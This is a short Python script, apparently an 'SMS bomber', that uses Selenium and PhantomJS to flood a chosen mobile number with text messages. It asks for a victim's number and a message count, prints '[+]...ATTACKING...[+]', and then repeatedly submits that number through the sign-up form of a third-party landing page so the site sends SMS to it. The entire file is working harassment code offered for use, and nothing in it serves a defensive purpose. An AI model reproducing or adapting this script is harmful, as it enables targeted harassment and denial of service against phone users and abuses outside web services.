import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.PhantomJS(executable_path=r'phantomjs.exe', port=0)
number = raw_input('Enter mobile number: ')
number = str(int(number))
u = unicode(number, "utf-8")
sms_number = raw_input('Enter number of sms:  ')
print('[+]...ATTACKING...[+]')
count = 0
while count < int(sms_number) :
    driver.get('http://eg.sunnygames.club/landing/eg/partial/?key=3158238532&oid=331&pb=VGhpcyBvZmZlciBleGNsdXNpdmVseSBwcm9tb3RlZCBieSA8YSBocmVmPSJodHRwOi8vYWZmc2hhcmsuY29tIj5BZmZTaGFyay5jb208L2E-IFBsZWFzZSBkbyBub3QgaGVzaXRhdGUgdG8gY29udGFjdCB1cw,,')
    inputelement = driver.find_element_by_name("m")
    inputelement.send_keys(u)
    driver.find_element_by_xpath('//*[@id="mobileBox"]/button').click()
    print('SMS has been sent successfully')
    count = count + 1
print('DONE')
